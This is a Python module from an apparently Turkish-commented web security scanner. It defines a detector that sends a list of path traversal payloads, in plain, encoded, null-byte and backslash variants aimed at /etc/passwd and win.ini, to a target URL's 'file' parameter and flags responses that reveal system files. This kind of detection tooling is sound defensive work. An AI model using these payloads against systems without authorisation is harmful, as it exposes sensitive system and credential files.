#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Path Traversal Advanced Detector
"""

from typing import List, Dict, Any
from loguru import logger
import urllib.parse

from .base import BaseDetector


class PathTraversalAdvancedDetector(BaseDetector):
    """Advanced Path Traversal Tespiti"""
    
    PATH_TRAVERSAL_PAYLOADS = [
        # Basic
        "../../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        
        # Encoding variations
        "..%2f..%2f..%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",  # Double URL encoding
        
        # Null byte
        "../../../../etc/passwd%00.txt",
        
        # Unicode normalization
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        
        # Case sensitivity bypass
        "..\\..\\..\\WINDOWS\\win.ini",
        
        # Backslash bypass
        "....\\\\....\\\\....\\\\windows\\\\win.ini",
    ]
    
    async def scan(self, url: str, **kwargs) -> List[Dict[str, Any]]:
        """
        Advanced path traversal taraması
        
        Args:
            url: Hedef URL
        
        Returns:
            Bulunan path traversal zafiyetleri
        """
        vulnerabilities = []
        logger.debug(f"🐛 Advanced Path Traversal taraması başlanıyor: {url}")
        
        try:
            for payload in self.PATH_TRAVERSAL_PAYLOADS:
                test_url = f"{url}?file={payload}"
                response = await self._get(test_url)
                
                if response and ('root:' in response or 'Administrator' in response):
                    vuln = self._create_vulnerability(
                        type_='Path Traversal',
                        severity='High',
                        url=url,
                        description=f'Path traversal ile sistem dosyaları okunabiliyor',
                        recommendation='Dosya yollarını whitelist ile kontrol et',
                        poc=payload,
                        cwe='CWE-22',
                        cvss_vector='CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N'
                    )
                    vulnerabilities.append(vuln)
                    break
        
        except Exception as e:
            logger.debug(f"❌ Path Traversal tarama hatası: {str(e)}")
        
        return vulnerabilities
